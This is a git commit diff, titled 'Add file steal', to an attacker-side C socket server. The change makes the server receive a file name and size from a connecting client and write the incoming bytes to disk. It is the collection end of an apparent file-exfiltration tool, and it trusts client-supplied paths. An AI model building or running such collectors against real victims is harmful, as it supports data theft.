63ee766388c7bd72906c463f7ac6bc183aee249b
HoangTPMAFK <hoangtpmafk@gmail.com>
2026-02-24 18:06:37 +0700

    Add file steal

--- attacker/socket_server.c
+++ attacker/socket_server.c
@@ -3,14 +3,15 @@
 #include <netinet/in.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <stdlib.h>
+
+#define CHUNK_SIZE 1024*256
 
 int main() {
     int server_socket;
     int client_socket;
-    int port = 32154;
+    int port = 32145;
     struct sockaddr_in server_address;
-    char buffer[100] = "Hello from server!\n";
-    char recv_buffer[100];
 
     server_socket = socket(AF_INET, SOCK_STREAM, 0);
     server_address.sin_family = AF_INET;
@@ -23,11 +24,25 @@ int main() {
 
     client_socket = accept(server_socket, NULL, NULL);
 
-    send(client_socket, buffer, sizeof(buffer), 0);
-
-    recv(client_socket, recv_buffer, sizeof(recv_buffer), 0);
-    printf("Client has sent: %s\n", recv_buffer);
-
+    char fileName[260] = {};
+    unsigned long long fileSize = 0;
+    recv(client_socket, fileName, 260, 0);
+    recv(client_socket, (char*)&fileSize, 8, 0);
+    printf("Client has sent: %s - %llu\n", fileName, fileSize);
+    FILE *  fptr = fopen(fileName, "wb");
+    char *buffer = (char*)malloc(CHUNK_SIZE);
+    unsigned long long total_received = 0;
+    int received_bytes = 0;
+    while (total_received < fileSize) {
+        unsigned long long remaining = fileSize - total_received;
+        int to_read = remaining > CHUNK_SIZE ? CHUNK_SIZE : remaining;
+        received_bytes = recv(client_socket, buffer, to_read, 0);
+        if (received_bytes <= 0) break;
+        fwrite(buffer, 1, received_bytes, fptr);
+        total_received += received_bytes;
+    }
+    free(buffer);
+    fclose(fptr);
     close(client_socket);
     close(server_socket);
     return 0;
